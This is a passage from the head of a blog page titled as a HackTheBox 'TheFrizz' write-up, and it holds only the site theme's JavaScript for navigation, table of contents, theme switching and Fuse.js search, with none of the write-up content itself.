<!DOCTYPE html>
<html lang="es" dir="ltr">

<head prefix="og: http://ogp.me/ns#">
    <meta http-equiv="Content-Type" content="text/html; charset=UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1">
    <meta http-equiv="X-UA-Compatible" content="IE=edge">
    <title>HackTheBox - TheFrizz â€“ sckull</title>
    


  
  <script defer src="/js/fuse.min.94c78ad70b02749822921660cf4e9f0b3701bc0680c421afb784a78228de0275.js"></script>



<script src="/js/enquire.min.dfb99dee1e029d51d6cfb672d847929890b1585402de17f5ed092edd72a688b4.js"></script>

<script defer src="/js/lazysizes.min.31dd6a2d3a1ec0f78a8df007535cf23f03aeb5c70f026e6d6a19dac3b3acc340.js"></script>

<script defer src="/js/helper/getParents.min.086022fb02d7a1517e33c2670bffb976b3e80bcacd9caeee0c6a586064f20e42.js"></script>

<script defer src="/js/helper/fadeinout.min.9fe4b81a87e722d20c220a2b6ca145a3d8a2cb3ea1e89de55329ff417bdd9570.js"></script>

<script defer src="/js/helper/closest.min.js"></script>
  
<script>
  "use strict";

  
  
  if (window.NodeList && !NodeList.prototype.forEach) {
    NodeList.prototype.forEach = Array.prototype.forEach;
  }

  
  if (!String.prototype.includes) {
    String.prototype.includes = function (search, start) {
      'use strict';

      if (search instanceof RegExp) {
        throw TypeError('first argument must not be a RegExp');
      }
      if (start === undefined) { start = 0; }
      return this.indexOf(search, start) !== -1;
    };
  }

  
  Document.prototype.append = Element.prototype.append = function append() {
    this.appendChild(_mutation(arguments));
  };
  function _mutation(nodes) {
    if (!nodes.length) {
      throw new Error('DOM Exception 8');
    } else if (nodes.length === 1) {
      return typeof nodes[0] === 'string' ? document.createTextNode(nodes[0]) : nodes[0];
    } else {
      var
      fragment = document.createDocumentFragment(),
      length = nodes.length,
      index = -1,
      node;

      while (++index < length) {
        node = nodes[index];

        fragment.appendChild(typeof node === 'string' ? document.createTextNode(node) : node);
      }

      return fragment;
    }
  }

  
  if (!String.prototype.startsWith) {
    String.prototype.startsWith = function (searchString, position) {
      position = position || 0;
      return this.indexOf(searchString, position) === position;
    };
  }
  


  document.addEventListener('DOMContentLoaded', function () {
    
    var navCollapseBtn = document.querySelector('.navbar__burger');
    navCollapseBtn ? navCollapseBtn.addEventListener('click', function (e) {
      var navCollapse = document.querySelector('.navbarm__collapse');

      if (navCollapse) {
        var dataOpen = navCollapse.getAttribute('data-open');

        if (dataOpen === 'true') {
          navCollapse.setAttribute('data-open', 'false');
          navCollapse.style.maxHeight = 0;
          navCollapseBtn.classList.remove('is-active');
        } else {
          navCollapse.setAttribute('data-open', 'true');
          navCollapse.style.maxHeight = navCollapse.scrollHeight + "px";
          navCollapseBtn.classList.add('is-active');
        }
      }
    }) : null;
    


    
    var summaryContainer = document.querySelector('.summary__container');
    var searchResult = document.querySelector('.search-result');
    var searchResultCloseBtn = document.querySelector('.search-result__close');
    searchResultCloseBtn ? searchResultCloseBtn.addEventListener('click', function (e) {
      searchResult.setAttribute('data-display', 'none');
      summaryContainer.setAttribute('data-display', 'block');
    }) : null;
    


    
    document.querySelectorAll('.tab') ? 
    document.querySelectorAll('.tab').forEach(function(elem, idx) {
      var containerId = elem.getAttribute('id');
      var containerElem = elem;
      var tabLinks = elem.querySelectorAll('.tab__link');
      var tabContents = elem.querySelectorAll('.tab__content');
      var ids = [];

      tabLinks && tabLinks.length > 0 ?
      tabLinks.forEach(function(link, index, self) {
        link.onclick = function(e) {
          for (var i = 0; i < self.length; i++) {
            if (index === parseInt(i, 10)) {
              if (!self[i].classList.contains('active')) {
                self[i].classList.add('active');
                tabContents[i].style.display = 'block';
              }
            } else {
              self[i].classList.remove('active');
              tabContents[i].style.display = 'none';
            }
          }
        }
      }) : null;
    }) : null;
    


    
    document.querySelectorAll('.codetab') ? 
    document.querySelectorAll('.codetab').forEach(function(elem, idx) {
      var containerId = elem.getAttribute('id');
      var containerElem = elem;
      var codetabLinks = elem.querySelectorAll('.codetab__link');
      var codetabContents = elem.querySelectorAll('.codetab__content');
      var ids = [];

      codetabLinks && codetabLinks.length > 0 ?
      codetabLinks.forEach(function(link, index, self) {
        link.onclick = function(e) {
          for (var i = 0; i < self.length; i++) {
            if (index === parseInt(i, 10)) {
              if (!self[i].classList.contains('active')) {
                self[i].classList.add('active');
                codetabContents[i].style.display = 'block';
              }
            } else {
              self[i].classList.remove('active');
              codetabContents[i].style.display = 'none';
            }
          }
        }
      }) : null;
    }) : null;
    


    
    var gttBtn = document.getElementById("gtt");
    gttBtn.style.display = "none";
    gttBtn.addEventListener('click', function () {
      if (window.document.documentMode) {
        document.documentElement.scrollTop = 0;
      } else {
        scrollToTop(250);
      }
    });

    function scrollToTop(scrollDuration) {
      var scrollStep = -window.scrollY / (scrollDuration / 15);
      var scrollInterval = setInterval(function () {
        if (window.scrollY != 0) {
          window.scrollBy(0, scrollStep);
        }
        else clearInterval(scrollInterval);
      }, 15);
    }

    var scrollFunction = function () {
      if (document.body.scrollTop > 250 || document.documentElement.scrollTop > 250) {
        gttBtn.style.display = "block";
      } else {
        gttBtn.style.display = "none";
      }
    }
    


    
    var expandBtn = document.querySelectorAll('.expand__button');

    for (let i = 0; i < expandBtn.length; i++) {
      expandBtn[i].addEventListener("click", function () {
        var content = this.nextElementSibling;
        if (content.style.maxHeight) {
          content.style.maxHeight = null;
          this.querySelector('svg').classList.add('expand-icon__right');
          this.querySelector('svg').classList.remove('expand-icon__down');
        } else {
          content.style.maxHeight = content.scrollHeight + "px";
          this.querySelector('svg').classList.remove('expand-icon__right');
          this.querySelector('svg').classList.add('expand-icon__down');
        }
      });
    }
    


    
    var lastScrollTop = window.pageYOffset || document.documentElement.scrollTop;
    var tocElem = document.querySelector('.toc');
    var tableOfContentsElem = tocElem ? tocElem.querySelector('#TableOfContents') : null;
    var toggleTocElem = document.getElementById('toggle-toc');
    var singleContentsElem = document.querySelector('.single__contents');
    var navbar = document.querySelector('.navbar');
    var tocFlexbox = document.querySelector('.toc__flexbox');
    var tocFlexboxOuter = document.querySelector('.toc__flexbox--outer');
    var expandContents = document.querySelectorAll('.expand__content');
    var boxContents = document.querySelectorAll('.box');
    var notAllowedTitleIds = null;

    
    var tocFolding = JSON.parse("null");
    
    var tocLevels = JSON.parse("null");
    
    if (tocLevels) {
      tocLevels = tocLevels.toString();
    } else {
      tocLevels = "h1, h2, h3, h4, h5, h6";
    }

    
    singleContentsElem && singleContentsElem.querySelectorAll(".tab") ?
    singleContentsElem.querySelectorAll(".tab").forEach(function (elem) {
      elem.querySelectorAll(tocLevels).forEach(function (element) {
        notAllowedTitleIds = Array.isArray(notAllowedTitleIds) ?
          notAllowedTitleIds.concat(element.getAttribute('id')) :
          [element.getAttribute('id')];
      });
    }) : null;

    
    expandContents ? expandContents.forEach(function(elem) {
      elem.querySelectorAll(tocLevels).forEach(function (element) {
        notAllowedTitleIds = Array.isArray(notAllowedTitleIds) ?
          notAllowedTitleIds.concat(element.getAttribute('id')) :
          [element.getAttribute('id')];
      });
    }) : null;

    
    boxContents ? boxContents.forEach(function(elem) {
      elem.querySelectorAll(tocLevels).forEach(function (element) {
        notAllowedTitleIds = Array.isArray(notAllowedTitleIds) ?
          notAllowedTitleIds.concat(element.getAttribute('id')) :
          [element.getAttribute('id')];
      });
    }) : null;

    
    window.onscroll = function () {
      scrollFunction();
      
      var st = window.pageYOffset || document.documentElement.scrollTop;
      if (st > lastScrollTop) { 
        if (st < 250) {
          gttBtn.style.display = "none";
        } else {
          gttBtn.style.display = "block";
        }

        if (st < 45) {
          return null;
        }
        
        if (!navbar.classList.contains('navbar--hide')) {
          navbar.classList.add('navbar--hide');
        } else if (navbar.classList.contains('navbar--show')) {
          navbar.classList.remove('navbar--show');
        }

        if (singleContentsElem) {
          if (singleContentsElem.querySelectorAll(tocLevels).length > 0) {
            singleContentsElem.querySelectorAll(tocLevels).forEach(function (elem) {
              if (toggleTocElem && !toggleTocElem.checked) {
                return null;
              }

              if (notAllowedTitleIds && notAllowedTitleIds.includes(elem.getAttribute('id'))) {
                return null;
              }
              
              if (document.documentElement.scrollTop >= elem.offsetTop) {
                if (tableOfContentsElem) {
                  var id = elem.getAttribute('id');
                  tocElem.querySelectorAll('a').forEach(function (elem) {
                    elem.classList.remove('active');
                  });
                  tocElem.querySelector('a[href="#' + id + '"]') ?
                    tocElem.querySelector('a[href="#' + id + '"]').classList.add('active') : null;

                  if (false === tocFolding) {
                    
                  } else {
                    tableOfContentsElem.querySelectorAll('ul') ?
                      tableOfContentsElem.querySelectorAll('ul').forEach(function (rootUl) {
                        rootUl.querySelectorAll('li').forEach(function (liElem) {
                          liElem.querySelectorAll('ul').forEach(function (ulElem) {
                            ulElem.style.display = 'none';
                          });
                        });
                      }) : null;
                  }

                  var curElem = tableOfContentsElem.querySelector("[href='#" + id + "']");
                  if (curElem && curElem.nextElementSibling) {
                    curElem.nextElementSibling.style.display = 'block';
                  }
                  getParents(curElem, 'ul') ?
                    getParents(curElem, 'ul').forEach(function (elem) {
                      elem.style.display = 'block';
                    }) : null;
                }
              }
            });
          } else {
            if (tocFlexbox) {
              tocFlexbox.setAttribute('data-position', '');
              if (!tocFlexbox.classList.contains('hide')) {
                tocFlexbox.classList.add('hide');
              }
            }
            if (tocFlexboxOuter) {
              tocFlexboxOuter.setAttribute('data-position', '');
              if (!tocFlexboxOuter.classList.contains('hide')) {
                tocFlexboxOuter.classList.add('hide');
              }
            }
          }
        }
      } else { 
        if (st < 250) {
          gttBtn.style.display = "none";
        }

        if (navbar.classList.contains('navbar--hide')) {
          navbar.classList.remove('navbar--hide');
        } else if (!navbar.classList.contains('navbar--show')) {
          navbar.classList.add('navbar--show');
        }

        if (singleContentsElem) {
          if (singleContentsElem.querySelectorAll(tocLevels).length > 0) {
            singleContentsElem.querySelectorAll(tocLevels).forEach(function (elem) {
              if (toggleTocElem && !toggleTocElem.checked) {
                return null;
              }
              
              if (notAllowedTitleIds && notAllowedTitleIds.includes(elem.getAttribute('id'))) {
                return null;
              }

              if (document.documentElement.scrollTop >= elem.offsetTop) {
                if (tableOfContentsElem) {
                  var id = elem.getAttribute('id');
                  tocElem.querySelectorAll('a').forEach(function (elem) {
                    elem.classList.remove('active');
                  });
                  tocElem.querySelector('a[href="#' + id + '"]') ?
                    tocElem.querySelector('a[href="#' + id + '"]').classList.add('active') : null;

                  if (false === tocFolding) {
                    
                  } else {
                    tableOfContentsElem.querySelectorAll('ul') ?
                      tableOfContentsElem.querySelectorAll('ul').forEach(function (rootUl) {
                        rootUl.querySelectorAll('li').forEach(function (liElem) {
                          liElem.querySelectorAll('ul').forEach(function (ulElem) {
                            ulElem.style.display = 'none';
                          });
                        });
                      }) : null;
                  }

                  var curElem = tableOfContentsElem.querySelector("[href='#" + id + "']");
                  if (curElem && curElem.nextElementSibling) {
                    curElem.nextElementSibling.style.display = 'block';
                  }
                  getParents(curElem, 'ul') ?
                    getParents(curElem, 'ul').forEach(function (elem) {
                      elem.style.display = 'block';
                    }) : null;
                }
              }
            });
          } else {
            if (tocFlexbox && !tocFlexbox.classList.contains('hide')) {
              tocFlexbox.classList.add('hide');
            }
            if (tocFlexboxOuter && !tocFlexboxOuter.classList.contains('hide')) {
              tocFlexboxOuter.classList.add('hide');
            }
          }
          
        }

        if (tableOfContentsElem && document.documentElement.scrollTop < 250) {
          if (false === tocFolding) {

          } else {
            tableOfContentsElem.querySelector('ul') ?
              tableOfContentsElem.querySelector('ul').querySelectorAll('li').forEach(function (liElem) {
                liElem.querySelectorAll('ul').forEach(function (ulElem) {
                  ulElem.style.display = 'none';
                });
              }) : null;
          }
        }
      }
      lastScrollTop = st <= 0 ? 0 : st;
    };
  


  
    var localTheme = localStorage.getItem('theme');
    var rootEleme = document.getElementById('root');
    var selectThemeElem = document.querySelectorAll('.select-theme');
    var selectThemeItemElem = document.querySelectorAll('.select-theme__item');

    var setMetaColor = function(themeColor) {
      var metaMsapplicationTileColor = document.getElementsByName('msapplication-TileColor')[0];
      var metaThemeColor = document.getElementsByName('theme-color')[0];
      var metaMsapplicationNavbuttonColor = document.getElementsByName('msapplication-navbutton-color')[0];
      var metaAppleMobileWebAappStatusBarStyle = document.getElementsByName('apple-mobile-web-app-status-bar-style')[0];

      if (themeColor.includes('dark')) {
        metaMsapplicationTileColor.setAttribute('content', '#fcfcfa');
        metaThemeColor.setAttribute('content', '#403E41');
        metaMsapplicationNavbuttonColor.setAttribute('content', '#403E41');
        metaAppleMobileWebAappStatusBarStyle.setAttribute('content', '#403E41');
      } else if (themeColor.includes('light')) {
        metaMsapplicationTileColor.setAttribute('content', '#555');
        metaThemeColor.setAttribute('content', '#eee');
        metaMsapplicationNavbuttonColor.setAttribute('content', '#eee');
        metaAppleMobileWebAappStatusBarStyle.setAttribute('content', '#eee');
      } else if (themeColor.includes('hacker')) {
        metaMsapplicationTileColor.setAttribute('content', '#e3cd26');
        metaThemeColor.setAttribute('content', '#252526');
        metaMsapplicationNavbuttonColor.setAttribute('content', '#252526');
        metaAppleMobileWebAappStatusBarStyle.setAttribute('content', '#252526');
      } else if (themeColor.includes('solarized')) {
        metaMsapplicationTileColor.setAttribute('content', '#d3af86');
        metaThemeColor.setAttribute('content', '#51412c');
        metaMsapplicationNavbuttonColor.setAttribute('content', '#51412c');
        metaAppleMobileWebAappStatusBarStyle.setAttribute('content', '#51412c');
      } else if (themeColor.includes('kimbie')) {
        metaMsapplicationTileColor.setAttribute('content', '#586e75');
        metaThemeColor.setAttribute('content', '#eee8d5');
        metaMsapplicationNavbuttonColor.setAttribute('content', '#eee8d5');
        metaAppleMobileWebAappStatusBarStyle.setAttribute('content', '#eee8d5');
      } 
    }
    
    if (localTheme) {
      selectThemeItemElem ? 
      selectThemeItemElem.forEach(function (elem) {
        if (elem.text.trim() === localTheme) {
          elem.classList.add('is-active');
        } else {
          elem.classList.remove('is-active');
        }
      }) : null;

      setMetaColor(localTheme);
    } else {
      setMetaColor(rootEleme.className);
    }

    selectThemeItemElem ? 
    selectThemeItemElem.forEach(function (v, i) {
      v.addEventListener('click', function (e) {
        var selectedThemeVariant = e.target.text.trim();
        localStorage.setItem('theme', selectedThemeVariant);
        setMetaColor(selectedThemeVariant);

        rootEleme.removeAttribute('class');
        rootEleme.classList.add('theme__' + selectedThemeVariant);
        selectThemeElem.forEach(function(rootElem) {
          rootElem.querySelectorAll('a').forEach(function (elem) {
            if (elem.classList) {
              if (elem.text.trim() === selectedThemeVariant) {
                if (!elem.classList.contains('is-active')) {
                  elem.classList.add('is-active');
                }
              } else {
                if (elem.classList.contains('is-active')) {
                  elem.classList.remove('is-active');
                }
              }
            }
          });
        });

        if (window.mermaid) {
          if (selectedThemeVariant === "dark" || selectedThemeVariant === "hacker") {
            mermaid.initialize({ theme: 'dark' });
            location.reload();
          } else {
            mermaid.initialize({ theme: 'default' });
            location.reload();
          }
        }

        var utterances = document.getElementById('utterances');
        if (utterances) {
          utterances.querySelector('iframe').contentWindow.postMessage({
            type: 'set-theme',
            theme: selectedThemeVariant === "dark" || selectedThemeVariant === "hacker" ? 'photon-dark' : selectedThemeVariant === 'kimbie' ? 'github-dark-orange' : 'github-light',
          }, 'https://utteranc.es');
        }

        var twitterCards = document.querySelectorAll('.twitter-timeline');
        if (twitterCards) {
          window.postMessage({
            type: 'set-twitter-theme',
            theme: selectedThemeVariant === 'light' || selectedThemeVariant === 'solarized' ? 'light' : 'dark',
          });
        }
      });
    }) : null;
  


  
    
    var baseurl = JSON.parse("\"https://sckull.github.io/\"");
    
    var permalink = JSON.parse("\"https://sckull.github.io/posts/thefrizz/\"");
    
    var langprefix = JSON.parse("\"\"");
    var searchResults = null;
    var searchMenu = null;
    var searchText = null;
    
    
    var enableSearch = JSON.parse("true");
    
    var enableSearchHighlight = JSON.parse("true");
    
    var searchResultPosition = JSON.parse("\"main\"");
    
    var sectionType = JSON.parse("\"posts\"");
    
    var kind = JSON.parse("\"page\"");
    
    var fuse = null;

    if (enableSearch) {
      (function initFuse() {
        var xhr = new XMLHttpRequest();
        if (sectionType === "publication" && kind !== "page") {
          xhr.open('GET', permalink + "index.json");
        } else {
          xhr.open('GET', baseurl + langprefix + "/index.json");
        }
        
        xhr.setRequestHeader('Content-Type', 'application/json; charset=utf-8');
        xhr.onload = function () {
          if (xhr.status === 200) {
            fuse = new Fuse(JSON.parse(xhr.response.toString('utf-8')), {
              keys: sectionType.includes('publication') ? ['title', 'abstract'] : ['title', 'description', 'content'],
              includeMatches: enableSearchHighlight,
              shouldSort: true,
              threshold: 0.4,
              location: 0,
              distance: 100,
              maxPatternLength: 32,
              minMatchCharLength: 1,
            });
            window.fuse = fuse;
          }
          else {
            console.error('[' + xhr.status + ']Error:', xhr.statusText);
          }
        };
        xhr.send();
      })();
    }

    function makeLi(ulElem, obj) {
      var li = document.createElement('li');
      li.className = 'search-result__item';
      
      var a = document.createElement('a');
      a.innerHTML = obj.title;
      a.setAttribute('class', 'search-result__item--title');
      a.setAttribute('href', obj.permalink);

      var descDiv = document.createElement('div');
      descDiv.setAttribute('class', 'search-result__item--desc');
      if (obj.description) {
        descDiv.innerHTML = obj.description;
      } else if (obj.content) {
        descDiv.innerHTML = obj.content.substring(0, 225);
      }
      
      li.appendChild(a);
      li.appendChild(descDiv);
      ulElem.appendChild(li);
    }

    function makeHighlightLi(ulElem, obj) {
      var li = document.createElement('li');
      li.className = 'search-result__item';
      var descDiv = null;

      var a = document.createElement('a');
      a.innerHTML = obj.item.title;
      a.setAttribute('class', 'search-result__item--title');
      a.setAttribute('href', obj.item.uri);

      if (obj.matches && obj.matches.length) {
        for (var i = 0; i < obj.matches.length; i++) {
          if ('title' === obj.matches[i].key) {
            a = document.createElement('a');
            a.innerHTML = generateHighlightedText(obj.matches[i].value, obj.matches[i].indices);
            a.setAttribute('class', 'search-result__item--title');
            a.setAttribute('href', obj.item.uri);
          }
          
          if ('description' === obj.matches[i].key) {
            descDiv = document.createElement('div');
            descDiv.setAttribute('class', 'search-result__item--desc');
            descDiv.innerHTML = generateHighlightedText(obj.item.description, obj.matches[i].indices);
          } else if ('content' === obj.matches[i].key) {
            if (!descDiv) {
              descDiv = document.createElement('div');
              descDiv.setAttribute('class', 'search-result__item--desc');
              descDiv.innerHTML = generateHighlightedText(obj.item.content.substring(0, 150), obj.matches[i].indices);
            }
          } else {
            if (obj.item.description) {
              descDiv = document.createElement('div');
              descDiv.setAttribute('class', 'search-result__item--desc');
              descDiv.innerHTML = obj.item.description;
            } else {
              descDiv = document.createElement('div');
              descDiv.setAttribute('class', 'search-result__item--desc');
              descDiv.innerHTML = obj.item.content.substring(0, 150);
            }
          }
        }

        li.appendChild(a);
        if (descDiv) {
          li.appendChild(descDiv);
        }
        if (li) {
          ulElem.appendChild(li);
        }
      }
    }

    function renderSearchResultsSide(searchText, results) {
      searchResults = document.getElementById('search-results');
      searchMenu = document.getElementById('search-menu');
      searchResults.setAttribute('class', 'dropdown is-active');
      
      var ul = document.createElement('ul');
      ul.setAttribute('class', 'dropdown-content search-content');

      if (results.length) {
        results.forEach(function (result) {
          var li = document.createElement('li');
          var a = document.createElement('a');
          a.setAttribute('href', result.uri);
          a.setAttribute('class', 'dropdown-item');
          a.appendChild(li);

          var titleDiv = document.createElement('div');
          titleDiv.innerHTML = result.title;
          titleDiv.setAttribute('class', 'menu-item__title');

          var descDiv = document.createElement('div');
          descDiv.setAttribute('class', 'menu-item__desc');
          if (result.description) {
            descDiv.innerHTML = result.description;
          } else if (result.content) {
            descDiv.innerHTML = result.content.substring(0, 150);
          }

          li.appendChild(titleDiv);
          li.appendChild(descDiv);
          ul.appendChild(a);
        });
      } else {
        var li = document.createElement('li');
        li.setAttribute('class', 'dropdown-item');
        li.innerText = 'No results found';
        ul.appendChild(li);
      }

      while (searchMenu.hasChildNodes()) {
        searchMenu.removeChild(
          searchMenu.lastChild
        );
      }
      
      searchMenu.appendChild(ul);
    }

    function renderSearchHighlightResultsSide(searchText, results) {
      searchResults = document.getElementById('search-results');
      searchMenu = document.getElementById('search-menu');
      searchResults.setAttribute('class', 'dropdown is-active');

      var ul = document.createElement('ul');
      ul.setAttribute('class', 'dropdown-content search-content');

      if (results.length) {
        results.forEach(function (result) {
          var li = document.createElement('li');
          var a = document.createElement('a');
          var descDiv = null;

          a.setAttribute('href', result.item.uri);
          a.setAttribute('class', 'dropdown-item');
          a.appendChild(li);

          var titleDiv = document.createElement('div');
          titleDiv.innerHTML = result.item.title;
          titleDiv.setAttribute('class', 'menu-item__title');
          
          if (result.matches && result.matches.length) {
            for (var i = 0; i < result.matches.length; i++) {
              if ('title' === result.matches[i].key) {
                titleDiv.innerHTML = generateHighlightedText(result.matches[i].value, result.matches[i].indices);
              }

              if ('description' === result.matches[i].key) {
                descDiv = document.createElement('div');
                descDiv.setAttribute('class', 'menu-item__desc');
                descDiv.innerHTML = generateHighlightedText(result.item.description, result.matches[i].indices);
              } else if ('content' === result.matches[i].key) {
                if (!descDiv) {
                  descDiv = document.createElement('div');
                  descDiv.setAttribute('class', 'menu-item__desc');
                  descDiv.innerHTML = generateHighlightedText(result.item.content.substring(0, 150), result.matches[i].indices);
                }
              } else {
                if (result.item.description) {
                  descDiv = document.createElement('div');
                  descDiv.setAttribute('class', 'menu-item__desc');
                  descDiv.innerHTML = result.item.description;
                } else {
                  descDiv = document.createElement('div');
                  descDiv.setAttribute('class', 'menu-item__desc');
                  descDiv.innerHTML = result.item.content.substring(0, 150);
                }
              }
            }
            
            li.appendChild(titleDiv);
            if (descDiv) {
              li.appendChild(descDiv);
            }
            ul.appendChild(a);
          }
        });
      } else {
        var li = document.createElement('li');
        li.setAttribute('class', 'dropdown-item');
        li.innerText = 'No results found';
        ul.appendChild(li);
      }

      while (searchMenu.hasChildNodes()) {
        searchMenu.removeChild(
          searchMenu.lastChild
        );
      }
      searchMenu.appendChild(ul);
    }

    function renderSearchResultsMobile(searchText, results) {
      searchResults = document.getElementById('search-mobile-results');

      var content = document.createElement('div');
      content.setAttribute('class', 'mobile-search__content');

      if (results.length > 0) {
        results.forEach(function (result) {
          var item = document.createElement('a');
          item.setAttribute('href', result.uri);
          item.innerHTML = '<div class="mobile-search__item"><div class="mobile-search__item--title">ðŸ“„ ' + result.title + '</div><div class="mobile-search__item--desc">' + (result.description ? result.description : result.content) + '</div></div>';
          content.appendChild(item);
        });
      } else {
        var item = document.createElement('span');
        content.appendChild(item);
      }

      let wrap = document.getElementById('search-mobile-results');
      while (wrap.firstChild) {
        wrap.removeChild(wrap.firstChild)
      }
      searchResults.appendChild(content);      
    }

    function renderSearchHighlightResultsMobile(searchText, results) {
      searchResults = document.getElementById('search-mobile-results');

      var ul = document.createElement('div');
      ul.setAttribute('class', 'mobile-search__content');

      if (results.length) {
        results.forEach(function (result) {
          var li = document.createElement('li');
          var a = document.createElement('a');
          var descDiv = null;

          a.setAttribute('href', result.item.uri);
          a.appendChild(li);
          li.setAttribute('class', 'mobile-search__item');

          var titleDiv = document.createElement('div');
          titleDiv.innerHTML = result.item.title;
          titleDiv.setAttribute('class', 'mobile-search__item--title');
          
          if (result.matches && result.matches.length) {
            for (var i = 0; i < result.matches.length; i++) {
              if ('title' === result.matches[i].key) {
                titleDiv.innerHTML = generateHighlightedText(result.matches[i].value, result.matches[i].indices);
              }

              if ('description' === result.matches[i].key) {
                descDiv = document.createElement('div');
                descDiv.setAttribute('class', 'mobile-search__item--desc');
                descDiv.innerHTML = generateHighlightedText(result.item.description, result.matches[i].indices);
              } else if ('content' === result.matches[i].key) {
                if (!descDiv) {
                  descDiv = document.createElement('div');
                  descDiv.setAttribute('class', 'mobile-search__item--desc');
                  descDiv.innerHTML = generateHighlightedText(result.item.content.substring(0, 150), result.matches[i].indices);
                }
              } else {
                if (result.item.description) {
                  descDiv = document.createElement('div');
                  descDiv.setAttribute('class', 'mobile-search__item--desc');
                  descDiv.innerHTML = result.item.description;
                } else {
                  descDiv = document.createElement('div');
                  descDiv.setAttribute('class', 'mobile-search__item--desc');
                  descDiv.innerHTML = result.item.content.substring(0, 150);
                }
              }
            }
            
            li.appendChild(titleDiv);
            if (descDiv) {
              li.appendChild(descDiv);
            }
            ul.appendChild(a);
          }
        });
      } else {
        var item = document.createElement('span');
        ul.appendChild(item);
      }

      let wrap = document.getElementById('search-mobile-results');
      while (wrap.firstChild) {
        wrap.removeChild(wrap.firstChild)
      }
      searchResults.appendChild(ul);
    }

    function generateHighlightedText(text, regions) {
      if (!regions) {
        return text;
      }

      var content = '', nextUnhighlightedRegionStartingIndex = 0;

      regions.forEach(function(region) {
        if (region[0] === region[1]) {
          return null;
        }
        
        content += '' +
          text.substring(nextUnhighlightedRegionStartingIndex, region[0]) +
          '<span class="search__highlight">' +
            text.substring(region[0], region[1] + 1) +
          '</span>' +
        '';
        nextUnhighlightedRegionStartingIndex = region[1] + 1;
      });

      content += text.substring(nextUnhighlightedRegionStartingIndex);

      return content;
    };

    var searchElem = document.getElementById('search');
    var searchMobile = document.getElementById('search-mobile');
    var searchResultsContainer = document.getElementById('search-results');

    searchElem ?
    searchElem.addEventListener('input', function(e) {
      if (!e.target.value | window.innerWidth < 770) {
        searchResultsContainer ? searchResultsContainer.setAttribute('class', 'dropdown') : null;
        searchResult ? searchResult.setAttribute('data-display', 'none') : null;
        summaryContainer ? summaryContainer.setAttribute('data-display', 'block') : null;
        return null;
      }

      searchText = e.target.value;
      var results = fuse.search(e.target.value);
      
      if (searchResultPosition === "main") {
        if (enableSearchHighlight) {
          renderSearchHighlightResultsMain(searchText, results);
        } else {
          renderSearchResultsMain(searchText, results);
        }
      } else {
        if (enableSearchHighlight) {
          renderSearchHighlightResultsSide(searchText, results);
        } else {
          renderSearchResultsSide(searchText, results);
        }
        
        var dropdownItems = searchResultsContainer.querySelectorAll('.dropdown-item');
        dropdownItems ? dropdownItems.forEach(function(item) {
          item.addEventListener('mousedown', function(e) {
            e.target.click();
          });
        }) : null;
      }
    }) : null;

    searchElem ? 
    searchElem.addEventListener('blur', function() {
      if (window.innerWidth < 770) {
        return null;
      }
      searchResultsContainer ? searchResultsContainer.setAttribute('class', 'dropdown') : null;
    }) : null;

    searchElem ? 
    searchElem.addEventListener('click', function(e) {
      if (window.innerWidth < 770) {
        return null;
      }
      if (!e.target.value) {
        searchResultsContainer ? searchResultsContainer.setAttribute('class', 'dropdown') : null;
        return null;
      }

      searchText = e.target.value;
      var results = fuse.search(e.target.value);

      if (searchResultPosition === "main") {
        if (enableSearchHighlight) {
          renderSearchHighlightResultsMain(searchText, results);
        } else {
          renderSearchResultsMain(searchText, results);
        }
      } else{
        if (enableSearchHighlight) {
          renderSearchHighlightResultsSide(searchText, results);
        } else {
          renderSearchResultsSide(searchText, results);
        }

        var dropdownItems = searchResultsContainer.querySelectorAll('.dropdown-item');
        dropdownItems ? dropdownItems.forEach(function (item) {
          item.addEventListener('mousedown', function (e) {
            e.target.click();
          });
        }) : null;
      }
    }) : null;

    var searchMenuElem = document.getElementById("search-menu");
    var activeItem = document.querySelector('#search-menu .dropdown-item.is-active');
    var activeIndex = null;
    var items = null;
    var searchContainerMaxHeight = 350;

    searchElem ? 
    searchElem.addEventListener('keydown', function(e) {
      if (window.innerWidth < 770) {
        return null;
      }

      if (e.key === 'Escape') {
        searchResult ? searchResult.setAttribute('data-display', 'none') : null;
        summaryContainer ? summaryContainer.setAttribute('data-display', 'block') : null;
      }

      var items = document.querySelectorAll('#search-menu .dropdown-item');
      var keyCode = e.which || e.keyCode;

      if (!items || !items.length) {
        return null;
      }
      
      if (e.key === 'ArrowDown' || keyCode === 40) {
        if (activeIndex === null) {
          activeIndex = 0;
          items[activeIndex].classList.remove('is-active');
        } else {
          items[activeIndex].classList.remove('is-active');
          activeIndex = activeIndex === items.length - 1 ? 0 : activeIndex + 1;
        }
        items[activeIndex].classList.add('is-active');

        let overflowedPixel = items[activeIndex].offsetTop + items[activeIndex].clientHeight - searchContainerMaxHeight;
        if (overflowedPixel > 0) {
          document.querySelector(".search-content").scrollTop += items[activeIndex].getBoundingClientRect().height;
        } else if (activeIndex === 0) {
          document.querySelector(".search-content").scrollTop = 0;
        }
      } else if (e.key === 'ArrowUp' || keyCode === 38) {
        if (activeIndex === null) {
          activeIndex = items.length - 1;
          items[activeIndex].classList.remove('is-active');
        } else {
          items[activeIndex].classList.remove('is-active');
          activeIndex = activeIndex === 0 ? items.length - 1 : activeIndex - 1;
        }
        items[activeIndex].classList.add('is-active');
        
        let overflowedPixel = items[activeIndex].offsetTop + items[activeIndex].clientHeight - searchContainerMaxHeight;
        if (overflowedPixel < 0) {
          document.querySelector(".search-content").scrollTop -= items[activeIndex].getBoundingClientRect().height;
        } else {
          document.querySelector(".search-content").scrollTop = overflowedPixel + items[activeIndex].getBoundingClientRect().height;
        }
      } else if (e.key === 'Enter' || keyCode === 13) {
        if (items[activeIndex] && items[activeIndex].getAttribute('href')) {
          location.href = items[activeIndex].getAttribute('href');
        }
      } else if (e.key === 'Escape' || keyCode === 27) {
        e.target.value = null;
        if (searchResults) {
          searchResults.classList.remove('is-active');
        }
      }
    }) : null;

    searchMobile ? 
    searchMobile.addEventListener('input', function(e) {
      if (!e.target.value) {
        let wrap = document.getElementById('search-mobile-results');
        while (wrap.firstChild) {
          wrap.removeChild(wrap.firstChild);
        }
        return null;
      }

      searchText = e.target.value;
      var results = fuse.search(e.target.value);
      renderSearchResultsMobile(searchText, results);
      if (enableSearchHighlight) {
        renderSearchHighlightResultsMobile(searchText, results);
      } else {
        renderSearchResultsMobile(searchText, results);
      }
    }) : null;
  


  
    var mobileSearchInputElem = document.querySelector('#search-mobile');
    var mobileSearchClassElem = document.querySelector('.mobile-search');
    var mobileSearchBtnElem = document.querySelector('#mobileSearchBtn');
